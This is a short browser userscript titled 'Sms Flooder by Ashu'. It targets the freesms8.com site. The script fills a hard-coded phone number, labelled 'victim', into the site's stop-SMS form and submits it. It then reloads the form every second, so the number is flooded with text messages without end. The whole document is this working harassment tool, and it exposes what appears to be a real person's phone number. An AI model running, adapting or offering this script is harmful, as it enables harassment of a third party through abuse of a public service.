// ==UserScript==
// @name           Sms Flooder by Ashu
// @namespace     Ashu
// @description    SMS Flooder
// @include       http://*freesms8.com/*
// @credits       One & Yash Singla

// ==/UserScript==

var victim=+917736970290
var delay=1000; // Enter delay in milliseconds if required

if(document.location=="http://www.freesms8.com/StopFreesms.aspx"||document.location=="http://freesms8.com/StopFreesms.aspx")
{
document.getElementById('ctl00_BodyPlaceHolder_MobileTb').value=victim;
document.getElementById('ctl00_BodyPlaceHolder_SubmitBt').click();
}
if(document.location=="http://www.freesms8.com/StopFreesms_verify.aspx"||document.location=="http://freesms8.com/SStopFreesms_verify.aspx")
setTimeout("document.location='http://www.freesms8.com/StopFreesms.aspx'",delay);